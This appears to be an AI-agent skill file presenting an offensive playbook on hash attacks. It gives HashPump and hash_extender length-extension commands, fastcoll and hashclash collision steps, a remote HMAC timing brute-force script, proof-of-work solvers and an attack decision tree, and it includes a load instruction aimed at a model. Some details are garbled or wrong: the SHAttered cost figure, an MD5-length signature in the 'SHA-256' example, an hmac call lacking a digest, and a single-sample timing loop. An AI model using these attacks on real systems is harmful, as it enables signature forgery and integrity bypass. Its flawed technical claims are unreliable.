---
name: hash-attack-techniques
description: Hash attack playbook — length extension (HashPump/hash_extender), MD5/SHA-1 collision (fastcoll/hashclash/SHAttered), birthday attacks, HMAC timing oracle, meet-in-the-middle, hash type identification, and PoW challenge solving.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Hash Attack Techniques — Expert Playbook

> **AI LOAD INSTRUCTION**: Covers all major cryptographic hash attacks: length extension, MD5/SHA-1 collision generation, birthday attack theory, HMAC timing oracle, meet-in-the-middle, and PoW solving. Base models often describe length extension conceptually without providing the actual HashPump/hash_extender tool commands, and miss the PoW solving patterns common in CTF challenges.

## 0. RELATED ROUTING

- jwt-cracker — if the target is JWT HMAC signing
- deserialization — many deserialization formats use weak hash-based signatures

---

## 1. HASH LENGTH EXTENSION ATTACK

### When to Apply

Target is using `hash(secret + message)` construction (NOT HMAC). Common in:
- Cookie signing: `SHA256(secret_key + cookie_data)`
- API signatures: `MD5(api_secret + request_params)`
- File integrity: `SHA1(salt + filename)`

### How It Works

SHA-1, SHA-256, SHA-512, and MD5 all use Merkle-Damgård construction. Given `H(secret + data)`, you can compute `H(secret + data + padding + append)` without knowing the secret.

The original hash state leaks the internal state after processing `secret + data`, which you can resume from.

### Tool: HashPump

```bash
# Install:
git clone https://github.com/bwall/HashPump
cd HashPump && make

# Usage:
# hashpump -s <signature> -d <known_data> -a <data_to_append> -k <key_length>
hashpump -s "2c624232cdd221771294dfbb310acbc2" \
         -d "count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo" \
         -a "&waffle=liege" \
         -k 14

# Output:
# New signature: <new_hash>
# New data: count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo\x80\x00...<padding>&waffle=liege
```

### Tool: hash_extender

```bash
# More flexible, supports MD5/SHA-1/SHA-256/SHA-512
./hash_extender \
  --data "count=10&user_id=1" \
  --secret-min-length 8 \
  --secret-max-length 20 \
  --append "&admin=true" \
  --signature "aabbcc..." \
  --format sha256
```

### Python Implementation (SHA-256 length extension)

```python
from hashpumpy import hashpump
# pip install hashpumpy

old_sig = "2c624232cdd221771294dfbb310acbc2"
old_data = "count=10&user_id=1"
append_data = "&admin=true"
key_length = 14  # brute-force if unknown (try 1-50)

new_sig, new_data = hashpump(old_sig, old_data, append_data, key_length)
print(f"New sig: {new_sig}")
print(f"New data (hex): {new_data.hex()}")
```

---

## 2. MD5 COLLISION ATTACK

### fastcoll (Fast MD5 Collision Generator)

Generates two different files with the same MD5 hash in seconds.

```bash
# Install: download binary from https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5-1.zip

# Generate collision pair with shared prefix:
fastcoll -p prefix.bin -o collision1.bin collision2.bin

# Verify:
md5sum collision1.bin collision2.bin
# Both should have the same MD5
```

### Use Cases

- Bypass MD5-based file integrity checks
- Hash collision in digital certificate CN (historical)
- CTF challenges: produce file A and file B with same MD5 but different content

### hashclash (Chosen-prefix MD5 collision)

```bash
# Chosen-prefix: given two arbitrary prefixes P1 and P2,
# compute suffixes S1 and S2 such that MD5(P1+S1) == MD5(P2+S2)
# More powerful: both files can have different, meaningful content

# Project: https://github.com/cr-marcstevens/hashclash
# Takes longer (hours to days) but produces meaningful collisions
```

---

## 3. SHA-1 COLLISION (SHATTERED)

The SHAttered attack (Google/CWI, 2017) demonstrates the first practical SHA-1 collision.

```bash
# Download the two shattered files:
# https://shattered.io/static/shattered-1.pdf and shattered-2.pdf

sha1sum shattered-1.pdf shattered-2.pdf
# Both: 38762cf7f55934b34d179ae6a4c80cadccbb7f0a

# Generate custom SHA-1 collisions:
# Tool: sha1collisiondetection and attack tools from shattered.io
# Practical collision generation takes ~6500 GPU-years on CPU, seconds on specialized hardware
```

### Practical Impact

- Git uses SHA-1 → two commits with same SHA-1 hash possible
- Document signing with SHA-1 → two documents with identical signatures
- TLS certificate fingerprinting

---

## 4. BIRTHDAY ATTACK (PROBABILITY)

For an n-bit hash, a birthday collision requires approximately 2^(n/2) attempts.

| Hash | Bits | Birthday Collision Attempts |
|---|---|---|
| MD5 | 128 | ~2^64 ≈ 1.8 × 10^19 |
| SHA-1 | 160 | ~2^80 |
| SHA-256 | 256 | ~2^128 |
| CRC32 | 32 | ~2^16 = 65536 |

### Session Token Birthday Attack

If session tokens are 64 bits, birthday collision at ~2^32 = 4 billion tokens:

```python
import hashlib, random, string

# Generate random session tokens and check for collisions
tokens = {}
attempts = 0

while True:
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    h = hashlib.md5(token.encode()).hexdigest()[:8]  # 32-bit truncated
    
    if h in tokens:
        print(f"Collision found after {attempts} attempts!")
        print(f"Token 1: {tokens[h]}, Token 2: {token}")
        break
    
    tokens[h] = token
    attempts += 1
```

---

## 5. HMAC TIMING ORACLE

If HMAC comparison is done without constant-time comparison, timing differences leak hash validity.

### Vulnerable Pattern

```python
# VULNERABLE: early return on first mismatch
def verify(msg, sig, secret):
    expected = hmac.new(secret, msg)
    return expected.digest() == sig  # Python == does byte-by-byte comparison (may short-circuit)
```

### Timing Attack (Remote)

```python
import hmac, hashlib, time, requests

def measure_time(payload, signature):
    start = time.perf_counter()
    r = requests.post('/api/verify', 
                      json={'data': payload, 'sig': signature},
                      timeout=5)
    return time.perf_counter() - start

# Brute-force signature byte by byte using timing
def brute_force_hmac(payload, known_prefix=""):
    best_char = None
    best_time = 0
    
    for c in range(256):
        candidate = known_prefix + chr(c) + "\x00" * (32 - len(known_prefix) - 1)
        t = measure_time(payload, candidate)
        if t > best_time:
            best_time = t
            best_char = chr(c)
    
    return known_prefix + best_char
```

### Safe Comparison

```python
# SAFE: constant-time comparison
import hmac
hmac.compare_digest(computed_signature, provided_signature)
```

---

## 6. MEET-IN-THE-MIDDLE ATTACK

Applies when hashing is done in two stages: `hash2(hash1(data))` with two separate secrets.

```
hash(key1, hash(key2, data))
```

**Strategy**:
1. For all possible key2: compute `H2 = hash(key2, data)` → store in table
2. For all possible key1: compute `H1 = hash(key1, target_hash)` → check if H1 is in table
3. Collision between H1 and H2 gives both keys

Reduces brute-force from O(2^n × 2^m) to O(2^n + 2^m).

```python
# Double-DES meet-in-the-middle example:
# Total keyspace: 2^112 for brute force
# MITM: 2^56 + 2^56 = 2^57 operations
```

---

## 7. HASH IDENTIFICATION

```bash
# hashid tool
hashid -m "5f4dcc3b5aa765d61d8327deb882cf99"
# Output: MD5, MD4, Double MD5...

# hashcat hash format detection
hashcat --identify hash.txt

# Common hash lengths:
# 32 hex chars = MD5 (128 bits)
# 40 hex chars = SHA-1 (160 bits)
# 56 hex chars = SHA-224 (224 bits)
# 64 hex chars = SHA-256 (256 bits)
# 96 hex chars = SHA-384 (384 bits)
# 128 hex chars = SHA-512 (512 bits)
# $2b$...60chars = bcrypt
# $1$...$...  = MD5crypt
# $6$...$...  = SHA-512crypt
```

---

## 8. PROOF-OF-WORK (PoW) SOLVING

Common in CTF challenges and anti-spam mechanisms.

### Hashcash Style PoW

```python
import hashlib, itertools, string

def solve_pow(prefix, difficulty=4):
    """Find X such that SHA256(prefix + X) starts with '0' * difficulty"""
    target = "0" * difficulty
    
    for i in itertools.count():
        candidate = prefix + str(i)
        h = hashlib.sha256(candidate.encode()).hexdigest()
        if h.startswith(target):
            print(f"Solution: {candidate}, Hash: {h}")
            return str(i)

solve_pow("RANDOMPREFIX", difficulty=5)
```

### Partial Preimage PoW

```python
import hashlib

def solve_pow_partial(prefix, target_suffix):
    """Find X such that MD5(prefix + X) ends with target_suffix"""
    for i in range(10**8):
        h = hashlib.md5(f"{prefix}{i}".encode()).hexdigest()
        if h.endswith(target_suffix):
            return i
    return None
```

---

## 9. ATTACK SELECTION DECISION TREE

```
Hash-based protection found?
├── What construction is it?
│   ├── H(secret + message) → LENGTH EXTENSION ATTACK
│   │   └── Use HashPump or hash_extender
│   ├── HMAC(secret, message) → TIMING ORACLE (remote)
│   │   └── Measure response time for each candidate byte
│   ├── H(H(key2, data), key1) → MEET-IN-THE-MIDDLE
│   │   └── Build precomputed table for one key, test against second
│   └── MD5/SHA-1 file fingerprint → COLLISION
│       ├── MD5: use fastcoll (seconds)
│       └── SHA-1: use shattered (practical, requires setup)
│
├── Hash collision needed?
│   ├── MD5: fastcoll → collision pair in <1 second
│   ├── SHA-1: SHAttered project tools (~6500 GPU-years naive, faster with modern hardware)
│   └── SHA-256+: not practically feasible (use different approach)
│
├── PoW challenge?
│   ├── Hashcash (find X where H(prefix+X) starts with 0s): counter brute-force
│   └── Custom PoW: analyze challenge, pick matching solver
│
└── Hash cracking (preimage)?
    └── Use hashcat with appropriate mode: -m 0 (MD5), -m 100 (SHA-1), etc.
```
